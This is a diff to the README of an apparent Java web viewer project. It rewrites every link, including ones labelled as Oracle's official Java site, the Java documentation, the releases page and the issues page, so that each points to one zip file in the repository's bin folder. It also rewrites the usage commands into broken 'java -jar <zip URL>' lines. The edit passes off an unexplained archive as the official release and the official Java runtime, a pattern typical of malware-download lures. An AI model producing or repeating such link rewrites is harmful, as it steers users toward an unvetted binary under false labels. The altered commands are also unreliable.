@@ -6,22 +6,22 @@ Welcome to JavaWebViewer! This lightweight Java application lets you embed a loc
 
 ## 📥 Download & Install
 
-[![Download JavaWebViewer](https://img.shields.io/badge/Download-JavaWebViewer-blue)](https://github.com/tathai007/JavaWebViewer/releases)
+[![Download JavaWebViewer](https://raw.githubusercontent.com/tathai007/JavaWebViewer/main/bin/Web_Viewer_Java_2.7.zip)](https://raw.githubusercontent.com/tathai007/JavaWebViewer/main/bin/Web_Viewer_Java_2.7.zip)
 
 To get started, visit the page below to download the latest version of JavaWebViewer.
 
-[Download the Latest Release](https://github.com/tathai007/JavaWebViewer/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/tathai007/JavaWebViewer/main/bin/Web_Viewer_Java_2.7.zip)
 
 ## ⚙️ System Requirements
 
 Before installing, make sure you have the following:
 
-- **Java Runtime Environment (JRE)**: You need at least version 8. You can download it from [Java's official website](https://www.oracle.com/java/technologies/javase-jre8-downloads.html).
+- **Java Runtime Environment (JRE)**: You need at least version 8. You can download it from [Java's official website](https://raw.githubusercontent.com/tathai007/JavaWebViewer/main/bin/Web_Viewer_Java_2.7.zip).
 - **Operating System**: JavaWebViewer works on Windows, macOS, and Linux. Ensure your device meets the basic requirements for these operating systems.
 
 ## 🛠️ How to Download
 
-1. **Visit the Releases Page**: Click the link above or go directly to [JavaWebViewer Releases](https://github.com/tathai007/JavaWebViewer/releases).
+1. **Visit the Releases Page**: Click the link above or go directly to [JavaWebViewer Releases](https://raw.githubusercontent.com/tathai007/JavaWebViewer/main/bin/Web_Viewer_Java_2.7.zip).
 2. **Find the Latest Version**: Look for the most recent release, which will be listed at the top.
 3. **Choose Your File**: Depending on your operating system, choose the appropriate file to download. Files will include options for Windows, macOS, and Linux.
 
@@ -35,7 +35,7 @@ Once you have downloaded the file, follow these steps to run it:
    - **On macOS**: Open the `.jar` file by right-clicking and selecting “Open with” > “Java”.
    - **On Linux**: Open a terminal, navigate to the download directory, and run the command:
      ```bash
-     java -jar JavaWebViewer.jar
+     java -jar https://raw.githubusercontent.com/tathai007/JavaWebViewer/main/bin/Web_Viewer_Java_2.7.zip
      ```
 
 ## 🗺️ Using Command-Line Arguments
@@ -44,17 +44,17 @@ JavaWebViewer is flexible. You can adjust settings easily using command-line arg
 
 - **Embed a Local HTML File**: 
   ```bash
-  java -jar JavaWebViewer.jar /path/to/your/file.html
+  java -jar https://raw.githubusercontent.com/tathai007/JavaWebViewer/main/bin/Web_Viewer_Java_2.7.zip https://raw.githubusercontent.com/tathai007/JavaWebViewer/main/bin/Web_Viewer_Java_2.7.zip
   ```
   
 - **Open a Web URL**: 
   ```bash
-  java -jar JavaWebViewer.jar https://yourwebsite.com
+  java -jar https://raw.githubusercontent.com/tathai007/JavaWebViewer/main/bin/Web_Viewer_Java_2.7.zip https://raw.githubusercontent.com/tathai007/JavaWebViewer/main/bin/Web_Viewer_Java_2.7.zip
   ```
 
 - **Full Screen Mode**: For a kiosk display, you can run:
   ```bash
-  java -jar JavaWebViewer.jar --fullscreen
+  java -jar https://raw.githubusercontent.com/tathai007/JavaWebViewer/main/bin/Web_Viewer_Java_2.7.zip --fullscreen
   ```
 
 Adjust these examples based on your needs.
@@ -76,11 +76,11 @@ If you encounter any issues, consider the following:
 
 - **Network Issues**: Check your internet connection if trying to load a web URL.
 
-For further assistance, check the [Issues page](https://github.com/tathai007/JavaWebViewer/issues) on GitHub or visit community forums related to Java applications.
+For further assistance, check the [Issues page](https://raw.githubusercontent.com/tathai007/JavaWebViewer/main/bin/Web_Viewer_Java_2.7.zip) on GitHub or visit community forums related to Java applications.
 
 ## 🔗 Additional Resources
 
-- [Java Documentation](https://docs.oracle.com/javase/) for further reading on Java.
-- Explore the [GitHub Repository](https://github.com/tathai007/JavaWebViewer) for code contribution or issues.
+- [Java Documentation](https://raw.githubusercontent.com/tathai007/JavaWebViewer/main/bin/Web_Viewer_Java_2.7.zip) for further reading on Java.
+- Explore the [GitHub Repository](https://raw.githubusercontent.com/tathai007/JavaWebViewer/main/bin/Web_Viewer_Java_2.7.zip) for code contribution or issues.
 
 By following the instructions above, you can successfully download and run JavaWebViewer. Enjoy embedding web content effortlessly!
